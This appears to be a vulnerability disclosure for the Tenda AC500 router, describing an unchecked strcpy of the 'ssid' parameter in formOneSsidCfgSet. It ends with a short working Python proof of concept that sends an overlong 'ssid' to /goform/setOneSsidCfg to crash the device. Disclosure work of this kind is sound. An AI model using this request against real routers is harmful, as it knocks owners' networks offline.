# Tenda Router AC500 Vulnerability
This vulnerability lies in the `/goform/setOneSsidCfg` page which influences the lastest version of Tenda Router AC500. (The latest version is [AC500_V1.0.0.16](https://www.tenda.com.cn/download/detail-2219.html))
## Vulnerability Description
There is a stack-based buffer overflow vulnerability in function `formOneSsidCfgSet`.

In function `formOneSsidCfgSet` it reads user provided parameter `ssid` into src`, and this two variable is passed into function `strcpy` without any length check, which may overflow the stack-based buffer `s`.
![](https://github.com/Funcy33/Vluninfo_Repo/blob/main/CNVDs/113_2/vlun.png)

So by requesting the page `/goform/setOneSsidCfg`, the attacker can easily perform a Deny of Service Attack.
## POC
```
import requests

IP = "10.10.10.1"
url = f"http://{IP}/goform/setOneSsidCfg?"
url += "ssid=" + "s" * 100

response = requests.get(url)
```
## Timeline
## Acknowledgment
Credit to [@Funcy_kilar](https://github.com/Funcy33) from Guangzhou University.
